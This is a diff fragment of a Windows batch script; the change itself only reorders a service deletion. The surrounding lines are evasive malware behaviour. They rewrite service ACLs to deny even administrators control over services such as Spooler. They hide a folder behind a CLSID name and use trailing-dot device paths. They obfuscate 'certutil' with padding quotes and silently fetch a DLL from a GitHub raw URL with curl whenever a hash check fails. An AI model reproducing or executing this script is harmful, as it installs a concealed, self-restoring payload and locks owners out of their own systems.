@@ -19,8 +19,8 @@ sc sdshow "Spooler" | findstr /C:"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;
 sc sdshow "OneSyncTask" | findstr /C:"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)" >nul || sc sdset "OneSyncTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
 
 sc sdset "WireGuar" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
-sc delete WireGuar
 rd /S /Q "\\?\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
+sc delete WireGuar
 
 taskkill.exe /f /IM prn.exe
 cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "24a0fb43e759f22c595e2c4d14e5e287" >nul || curl.exe -s -L -o "\\.\%ProgramData%\prndata..\prn" "https://github.com/vltex/1/raw/1/0/IconL.dll"
